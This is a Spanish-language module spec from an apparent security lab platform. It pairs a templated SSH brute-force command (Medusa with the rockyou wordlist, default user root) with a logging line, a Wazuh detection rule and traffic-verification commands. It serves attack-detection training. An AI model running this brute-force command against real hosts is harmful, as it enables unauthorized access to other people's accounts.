# MOD11 — Fuerza Bruta SSH (Medusa)
ID: BF-001 | MITRE: T1110 | Wazuh Rule: 100510 | Risk: HIGH

## Comando (INMUTABLE)
sudo medusa -h {{target}} -u {{username}} -P /usr/share/wordlists/rockyou.txt -M ssh

## Parámetros
| name     | type | default | required |
|----------|------|---------|----------|
| target   | text | ""      | true     |
| username | text | root    | true     |

## Logger (INMUTABLE)
logger -t CyberShield -p local0.alert "SEC_VIOLATION: SSH Brute Force attack detected against {{target}} user {{username}} - MITRE:T1110"

## Regla Wazuh (INMUTABLE)
<rule id="100510" level="12">
  <if_sid>1002</if_sid>
  <match>SEC_VIOLATION: SSH Brute Force</match>
  <description>ALERTA CYBERSHIELD: Ataque de fuerza bruta SSH detectado</description>
  <mitre><id>T1110</id></mitre>
</rule>

## Nota crítica
rockyou.txt debe existir en Kali (/usr/share/wordlists/).
Descomprimirlo primero: sudo gunzip /usr/share/wordlists/rockyou.txt.gz

## Verificación en Kali (ejecutar en paralelo al ataque)
```bash
sudo tcpdump -i eth0 port 22 -nn 2>/dev/null | head -10
sudo tail -f /var/log/auth.log | grep "Failed password"
```
